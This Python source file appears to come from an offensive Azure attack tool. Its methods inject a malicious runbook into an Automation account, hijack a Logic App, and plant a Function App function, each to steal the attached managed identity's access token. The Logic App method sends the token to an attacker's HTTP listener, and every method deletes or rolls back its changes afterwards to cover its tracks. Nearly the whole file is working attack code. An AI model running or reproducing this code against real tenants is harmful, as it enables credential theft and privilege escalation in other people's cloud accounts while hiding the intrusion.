import uuid
import time
import json
from glibby import TEMPLATES_PATH


class Attacks:
    def __init__(self, rm_operations):
        self.rm_operations = rm_operations

    def delete_object(self, endpoint, object_name):
        """
        Deletes a runbook / function / other object.
        :param endpoint: The deletion endpoint url
        :param object_name: The name of the object to delete
        :return: Boolean. True if succeeded, false otherwise
        """

        response = self.rm_operations.session.delete(endpoint)
        if response.status_code == 200:
            print('[+] Deleted {0}'.format(object_name))
            return True
        else:
            print('[-] Error deleting {0}'.format(object_name))
            self.rm_operations.display_response_info(response)
            return False

    '''
    def delete_runbook(self, runbook_delete_endpoint, runbook_name):
        """
        Deletes a runbook object
        :param runbook_delete_endpoint:
        :param runbook_name:
        :return:
        """
        response = self.rm_operations.session.delete(runbook_delete_endpoint)
        if response.status_code == 200:
            print('[+] Deleted {0}'.format(runbook_name))
        else:
            print('[-] Error deleting {0}'.format(runbook_name))
            self.rm_operations.display_response_info(response)'''

    def inject_runbook_to_automation_account(self, subscription_id, resource_group, name,
                                             runbook_name='AzureAutomationTutorialWithIdentityCLI', location='eastus'):
        """
        Creates a new, malicious runbook inside an existing automation account that runs with a managed identity in
        order to steal managed identity's access token.
        :param subscription_id: The id of the subscription that contains the automation account
        :param resource_group: The name of the resource group that contains the automation account
        :param name: The name of the automation account
        :param runbook_name: Name of the new runbook to create. Default is 'AzureAutomationTutorialWithIdentityCLI'
        :param location: The location of the automation account. Default is 'eastus'
        :return: String. The retrieved access token.
        """

        token = ''

        runbook_base_endpoint = ('https://management.azure.com/subscriptions/{0}/resourceGroups/{1}/providers/' \
                                'Microsoft.Automation/automationAccounts/{2}/runbooks/{3}'.format
                                 (subscription_id, resource_group, name, runbook_name))
        runbook_create_endpoint = '{0}?api-version=2017-05-15-preview'.format(runbook_base_endpoint)

        body = {
            'location': location,
            'name': runbook_name,
            'properties': {
                'runbookType': 'PowerShell72',
                'description': 'Default Runbook',
                'draft': {},
                'logProgress': False,
                'logVerbose': False
            }
        }
        self.rm_operations.session.headers['Content-Type'] = 'application/json'
        response = self.rm_operations.session.put(runbook_create_endpoint, json=body)
        if response.status_code == 201:
            print('[+] Created runbook {0} in {1}'.format(runbook_name, name))
        elif response.status_code == 200:
            print('[!] Runbook {0} already exists. Quitting'.format(runbook_name))
            del self.rm_operations.session.headers['Content-Type']
            return token
        else:
            print('[-] Error creating runbook {0}'.format(runbook_name))
            self.rm_operations.display_response_info(response)
            del self.rm_operations.session.headers['Content-Type']
            return token

        with open(f'{TEMPLATES_PATH}\\malicious_runbook_managed_identity.ps1', 'r', encoding='utf-8') as file:
            powershell = file.read()
        self.rm_operations.session.headers['Content-Type'] = 'text/powershell'
        runbook_content_endpoint = '{0}/draft/content?api-version=2015-10-31'.format(runbook_base_endpoint)
        response = self.rm_operations.session.put(runbook_content_endpoint, data=powershell)
        if response.status_code == 202:
            print('[+] Modified runbook {0}'.format(runbook_name))
        else:
            print('[-] Error modifying runbook {0}. Cleaning up...'.format(runbook_name))
            self.rm_operations.display_response_info(response)
            self.delete_object(runbook_create_endpoint, runbook_name)
            return token

        runbook_publish_endpoint = '{0}/publish?api-version=2023-11-01'.format(runbook_base_endpoint)
        response = self.rm_operations.session.post(runbook_publish_endpoint)
        del self.rm_operations.session.headers['Content-Type']
        if response.status_code == 202:
            print('[+] Published runbook {0}'.format(runbook_name))
        else:
            print('[-] Error publishing runbook {0}. Cleaning up...'.format(runbook_name))
            self.rm_operations.display_response_info(response)
            self.delete_object(runbook_create_endpoint, runbook_name)
            return token

        job_id = str(uuid.uuid4())
        job_base_endpoint = 'https://management.azure.com/subscriptions/{0}/resourceGroups/{1}/providers/Microsoft.Automation/automationAccounts/{2}/jobs/{3}'.format(
            subscription_id, resource_group, name, job_id)
        runbook_run_job_endpoint = '{0}?api-version=2017-05-15-preview'.format(job_base_endpoint)
        body = {
            'properties': {
                'parameters': {},
                'runbook': {
                    'name': runbook_name
                }  # ,
                # 'runOn': ""
            }
        }
        self.rm_operations.session.headers['Content-Type'] = 'application/json'
        response = self.rm_operations.session.put(runbook_run_job_endpoint, json=body)
        del self.rm_operations.session.headers['Content-Type']
        if response.status_code == 200 or response.status_code == 201:
            print('[+] Ran {0}. Job ID: {1}'.format(runbook_name, job_id))
        else:
            print('[-] Error running {0}. Cleaning up...'.format(runbook_name))
            self.rm_operations.display_response_info(response)
            self.delete_object(runbook_create_endpoint, runbook_name)
            return token

        while True:
            print(
                '[~] Waiting 120 seconds for the runbook to finish running (sometimes it takes long for the runbook to be run)')
            time.sleep(120)
            runbook_output_endpoint = '{0}/output?api-version=2017-05-15-preview'.format(job_base_endpoint)
            response = self.rm_operations.session.get(runbook_output_endpoint)
            if response.status_code == 200:
                token = response.content.decode('utf-8').replace('\r\n', '')
                if token:
                    print('[+] Retrieved output from {0}:'.format(runbook_name))
                    print(token)
                    break
                else:
                    choice = input('[?] The runbook did not finish run. Do you want to wait another 120 seconds (y/n)?')
                    if choice.lower() != 'y':
                        print('[~] Cleaning up...')
                        break
            else:
                print('[-] Error retrieving output from {0}. Cleaning up...'.format(runbook_name))
                break

        self.delete_object(runbook_create_endpoint, runbook_name)
        return token

    def inject_logic_app(self, subscription_id, resource_group, name, uri):
        """
        This function replaces the content of a legitimate logic app with a malicious one in order to steal an access
        token of the managed identity that is attached to the logic app. After the malicious logic app runs, this
        function rolls back the malicious logic app to the previous, legitimate one.
        :param subscription_id: ID of the subscription that contains the logic app
        :param resource_group: The name of the resource group that contains the logic app
        :param name: The name of the logic app
        :param uri: A URI of http listener of the attacker. Used in order to retrieve the access token.
        :return: Boolean. True if succeeded, false otherwise.
        """

        workflow_path = '/subscriptions/{0}/resourceGroups/{1}/providers/Microsoft.Logic/workflows/{2}'.format(
            subscription_id, resource_group, name)
        workflow_content_endpoint = 'https://management.azure.com{0}?api-version=2016-10-01'.format(workflow_path)
        workflow_run_endpoint = 'https://management.azure.com{0}/triggers/Recurrence/run?api-version=2016-10-01'.format(
            workflow_path)

        response = self.rm_operations.session.get(
            '{0}&$expand=connections.json,parameters.json'.format(workflow_content_endpoint))
        if response.status_code == 200:
            original_content = json.loads(response.content.decode('utf-8'))
            print('[+] Obtained logic app properties')
            #print(original_content)
        else:
            print('[-] Error obtaining logic app properties')
            self.rm_operations.display_response_info(response)
            return False

        with open(f'{TEMPLATES_PATH}\\malicious_logic_app.json', 'r', encoding='utf-8') as file:
            malicious_definitions = json.loads(file.read())['definition']
            malicious_definitions['actions']['HTTP']['inputs']['uri'] = uri

        malicious_content = {
            'properties': {
                'provisioningState': 'Succeeded',
                'state': 'Enabled',
                'version': original_content['properties']['version'],
                'definition': malicious_definitions,
                'parameters': original_content['properties']['parameters'],
                'endpointsConfiguration': original_content['properties']['endpointsConfiguration']
            },
            'id': original_content['id'],
            'name': original_content['name'],
            'type': original_content['type'],
            'location': original_content['location'],
            'identity': original_content['identity']
        }

        self.rm_operations.session.headers['Content-Type'] = 'application/json'
        response = self.rm_operations.session.put(workflow_content_endpoint, json=malicious_content)
        if response.status_code == 200:
            print('[+] Modified the "{0}" logic app'.format(name))
        else:
            print('[-] Error modifying the "{0}" logic app'.format(name))
            self.rm_operations.display_response_info(response)
            del self.rm_operations.session.headers['Content-Type']
            return False

        print('[~] Waiting 10 seconds for the logic app to get triggered')
        time.sleep(10)

        response = self.rm_operations.session.post(workflow_run_endpoint)
        if response.status_code == 200 or response.status_code == 202:
            print('[+] Ran the malicious logic app')
        else:
            print('[-] Error running the malicious logic app')
            self.rm_operations.display_response_info(response)

        response = self.rm_operations.session.put(workflow_content_endpoint, json=original_content)
        if response.status_code == 200:
            print('[+] Rolled back the "{0}" logic app'.format(name))
        else:
            print('[-] Error rolling back the "{0}" logic app'.format(name))
            self.rm_operations.display_response_info(response)
        del self.rm_operations.session.headers['Content-Type']

        return True

    '''
    def delete_function(self, url, function_name):
        response = self.rm_operations.session.delete(f"{url}")
        if response.status_code == 204:
            print('[+] Deleted the "{0}" function'.format(function_name))
        else:
            print('[-] Error deleting the "{0}" function'.format(function_name))'''

    def create_function_app(self, subscription_id, resource_group, function_app_name, function_name='HttpTrigger_3'):
        """
        Creates a new, malicious function inside an existing function app that runs with a managed identity in
        order to steal managed identity's access token.
        :param subscription_id: ID of the subscription that contains the function app.
        :param resource_group: Name of the resource group that contains the function app.
        :param function_app_name: Name of the function app.
        :param function_name: Name of the new function.
        :return: String. If succeeded, the managed identity's token is returned. Otherwise, an empty string is returned.
        """

        token = ''

        function_app_base_endpoint = "https://management.azure.com"
        creation_api_endpoint = '2022-03-01'
        execution_api_endpoint = '2018-11-01'

        function_app_generic_endpoint = f"{function_app_base_endpoint}/subscriptions/{subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Web/sites/{function_app_name}/functions/{function_name}"
        function_app_creation_endpoint = f"{function_app_generic_endpoint}?api-version={creation_api_endpoint}"
        function_app_execution_endpoint = f"{function_app_generic_endpoint}?api-version={execution_api_endpoint}"

        with open(f'{TEMPLATES_PATH}\\malicious_function_app.ps1', 'r', encoding='utf-8') as file:
            malicious_function_app = file.read()

        malicious_content = {
            'properties': {
                "name": "{0}".format(function_name),
                "files": {
                    "run.ps1": f"{malicious_function_app}"
                },
                "test_data": "{\r\n    \"name\": \"Azure\"\r\n}\r\n",
                "config": {
                    "bindings": [
                        {
                            "authLevel": "function",
                            "type": "httpTrigger",
                            "direction": "in",
                            "name": "Request",
                            "methods": [
                                "get",
                                "post"
                            ]
                        },
                        {
                            "type": "http",
                            "direction": "out",
                            "name": "Response"
                        }
                    ]
                }
            }
        }

        self.rm_operations.session.headers['Content-Type'] = 'application/json'
        response = self.rm_operations.session.put(f"{function_app_creation_endpoint}", json=malicious_content)

        if response.status_code == 201:
            print('[+] Created the "{0}" function'.format(function_name))
        else:
            print('[-] Error creating the "{0}" function'.format(function_name))
            self.rm_operations.display_response_info(response)
            del self.rm_operations.session.headers['Content-Type']
            return token

        list_keys_endpoint = f'{function_app_generic_endpoint}/listKeys?api-version={creation_api_endpoint}'
        response = self.rm_operations.session.post(list_keys_endpoint)
        if response.status_code != 200:
            print('[-] Error listing function keys')
            self.rm_operations.display_response_info(response)
            self.delete_object(function_app_creation_endpoint, function_name)
            return token

        code = json.loads(response.content.decode('utf-8'))['default']
        print(code)

        body = {
            'properties': {
                "name": "{0}".format(function_name),
                "function_app_id": None,
                "script_root_path_href": "https://{0}.azurewebsites.net/admin/vfs/site/wwwroot/{1}/".format(function_app_name, function_name),
                "script_href": "https://{0}.azurewebsites.net/admin/vfs/site/wwwroot/{1}/run.ps1".format(function_app_name, function_name),
                "config_href": "https://{0}.azurewebsites.net/admin/vfs/site/wwwroot/{1}/function.json".format(function_app_name, function_name),
                "test_data_href": "https://{0}.azurewebsites.net/admin/vfs/data/Functions/sampledata/{1}.dat".format(function_app_name, function_name),
                "secrets_file_href": None,
                "href": "https://{0}.azurewebsites.net/admin/functions/{1}".format(function_app_name, function_name),
                "config": {
                    "bindings": [
                        {
                            "authLevel": "function",
                            "type": "httpTrigger",
                            "direction": "in",
                            "name": "Request",
                            "methods": [
                                "get",
                                "post"
                            ]
                        },
                        {
                            "type": "http",
                            "direction": "out",
                            "name": "Response"
                        }
                    ]
                },
                "files": None,
                "test_data": "{\"body\":\"{\\r\\n    \\\"name\\\": \\\"Azure\\\"\\r\\n}\\r\\n\",\"headers\":[],\"method\":\"post\",\"queryStringParams\":[]}",
                "invoke_url_template": "https://{0}.azurewebsites.net/api/httptrigger_3".format(function_app_name),
                "language": "powershell",
                "isDisabled": False
            }
        }
        response = self.rm_operations.session.put(f"{function_app_execution_endpoint}", json=body)
        del self.rm_operations.session.headers['Content-Type']
        if response.status_code == 201:
            print('[+] Executed {0}'.format(function_name))
        else:
            print('[-] Failed to execute {0}'.format(function_name))
            self.rm_operations.display_response_info(response)
            self.delete_object(function_app_creation_endpoint, function_name)
            return token

        print(response.content.decode('utf-8'))

        print('[~] Waiting 10 seconds for the function app to finish running')
        time.sleep(10)

        fetch_results_endpoint = f'https://{function_app_name}.azurewebsites.net/api/{function_name}?code={code}'

        response = self.rm_operations.session.post(fetch_results_endpoint, json={'name': 'Azure'})
        if response.status_code == 200:
            print('[+] Fetched results')
            credentials = json.loads(response.content.decode('utf-8'))
            token = credentials['access_token']
            print('\tToken: {0}'.format(token))
            print('\tExpires On: {0}'.format(credentials['expires_on']))
            print('\tresource: {0}'.format(credentials['resource']))
            print('\ttoken_type: {0}'.format(credentials['token_type']))
            print('\tclient_id: {0}'.format(credentials['client_id']))
        else:
            print('[-] Error fetching the results of the function')
            self.rm_operations.display_response_info(response)

        self.delete_object(function_app_creation_endpoint, function_name)

        return token

